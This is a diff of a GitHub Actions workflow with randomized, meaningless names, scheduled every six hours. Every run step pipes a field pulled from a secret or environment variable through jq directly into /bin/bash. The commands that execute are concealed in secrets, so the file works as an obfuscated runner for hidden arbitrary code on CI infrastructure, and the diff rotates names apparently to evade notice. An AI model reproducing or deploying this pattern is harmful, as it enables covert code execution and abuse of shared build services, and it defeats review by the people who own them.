@@ -1,25 +1,26 @@
 name: yubanzhi4980
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
-jobs:  # 25640
+    - cron: '43 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yubanzhi4980
         env:
-          taddb0: ${{ secrets.taddb0 }}
+          xhg21377: ${{ secrets.xhg21377 }}
         run: |
-          echo $taddb0 | jq -r .q901 | /bin/bash
-          echo $i82633 | jq -r .nsfwi6467 | /bin/bash
-          echo $ieys92217 | jq -r .mw760 | /bin/bash
-          echo $z4781 | jq -r .obwcy515 | /bin/bash
-          echo $opry20409 | jq -r .wjm542 | /bin/bash
-          echo $vgwvu0498 | jq -r .e2738 | /bin/bash
-          echo $xzs82 | jq -r .aowk4120 | /bin/bash
-          echo $vm82 | jq -r .yauw4 | /bin/bash
-          echo $luzl263 | jq -r .tjfx4626 | /bin/bash
+          echo $xhg21377 | jq -r .hdxds43697 | /bin/bash
+          echo $atayb8 | jq -r .kseo2 | /bin/bash
+          echo $ojf20373 | jq -r .xi06 | /bin/bash
+          echo $s99608 | jq -r .rek632 | /bin/bash
+          echo $ume05 | jq -r .n7026 | /bin/bash
+          echo $wqm74 | jq -r .a5 | /bin/bash
+          echo $hae34640 | jq -r .qpsu237 | /bin/bash
+          echo $taemt9679 | jq -r .dljpr5 | /bin/bash
+          echo $wf5 | jq -r .dbf5229 | /bin/bash
+          echo $pyt9553 | jq -r .enzn6 | /bin/bash
 
